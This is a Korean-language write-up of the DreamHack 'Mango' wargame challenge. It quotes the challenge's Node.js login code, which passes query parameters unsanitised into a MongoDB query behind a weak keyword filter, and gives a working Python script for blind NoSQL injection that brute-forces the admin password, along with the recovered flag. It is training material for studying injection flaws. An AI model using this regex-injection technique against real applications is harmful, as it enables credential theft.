# [DreamHack] Mango

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 데이터베이스에 저장된 플래그를 획득하는 문제입니다.
> 플래그는 admin 계정의 비밀번호 입니다.
> 플래그의 형식은 DH{…} 입니다.
> {‘uid’: ‘admin’, ‘upw’: ‘DH{32alphanumeric}’}
>
> Release: [Mango.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8551785/Mango.zip)

## Analysis

### filter()

```javascript
// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
```

이용자의 입력에는 대소문자 구분 없이 `admin`, `dh`, `admi` 세 단어는 포함될 수 없다.

### /login

```javascript
app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});
```

`uid`와 `upw`를 입력하면 DB에서 그 `uid`와 `upw`에 해당하는 결과를 반환한다. Blind NoSQL injection으로 `admin`의 `upw`를 알아내야 한다.

## Exploit

`admin`은 정규식을 이용하여 `uid[$regex]=adm..`으로 표현할 수 있다. 그리고 `upw`는 `DH{32alphanumeric}` 형태이므로 `D.{.*`로 표현할 수 있다. 여기에서 `D.{a.*`, `D.{ab.*` 이런 식으로 한 글자씩 브루트포싱을 해서 `admin`을 반환하는 경우를 찾아내면 된다.

```python
import requests
import string

url = 'http://host1.dreamhack.games:11885/login?uid[$regex]=adm..&upw[$regex]=D.{'
alphanumeric = string.ascii_letters + string.digits # 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
flag = ''

for i in range(32):
    for char in alphanumeric:
        res = requests.get(url + flag + char + '.*')
        if res.text == 'admin':
            flag += char
            print('DH{' + flag)
            break

print('DH{' + flag + '}')
```

```
$ python3 solve.py
DH{8
DH{89
DH{89e
DH{89e5
DH{89e50
DH{89e50f
DH{89e50fa
DH{89e50fa6
DH{89e50fa6f
DH{89e50fa6fa
DH{89e50fa6faf
DH{89e50fa6fafe
DH{89e50fa6fafe2
DH{89e50fa6fafe26
DH{89e50fa6fafe260
DH{89e50fa6fafe2604
DH{89e50fa6fafe2604e
DH{89e50fa6fafe2604e3
DH{89e50fa6fafe2604e33
DH{89e50fa6fafe2604e33c
DH{89e50fa6fafe2604e33c0
DH{89e50fa6fafe2604e33c0b
DH{89e50fa6fafe2604e33c0ba
DH{89e50fa6fafe2604e33c0ba0
DH{89e50fa6fafe2604e33c0ba05
DH{89e50fa6fafe2604e33c0ba058
DH{89e50fa6fafe2604e33c0ba0584
DH{89e50fa6fafe2604e33c0ba05843
DH{89e50fa6fafe2604e33c0ba05843d
DH{89e50fa6fafe2604e33c0ba05843d3
DH{89e50fa6fafe2604e33c0ba05843d3d
DH{89e50fa6fafe2604e33c0ba05843d3df
DH{89e50fa6fafe2604e33c0ba05843d3df}
```